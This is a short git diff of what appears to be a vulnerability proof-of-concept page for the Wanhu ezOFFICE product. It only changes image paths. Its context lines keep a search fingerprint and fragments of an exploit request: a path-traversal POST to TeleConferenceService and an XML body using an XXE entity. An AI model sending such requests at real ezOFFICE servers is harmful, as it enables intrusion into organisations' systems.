@@ -20,7 +20,7 @@ app="万户网络-ezOFFICE"
 
 产品页面
 
-![](images/202209131048922.png)
+![](../.gitbook/assets/202209131050540.png)
 
 验证POC
 
@@ -33,4 +33,4 @@ POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService
 <value>&xxe;</value>
 ```
 
-![](images/202209131049806.png)
+![](../.gitbook/assets/202209131049806.png)
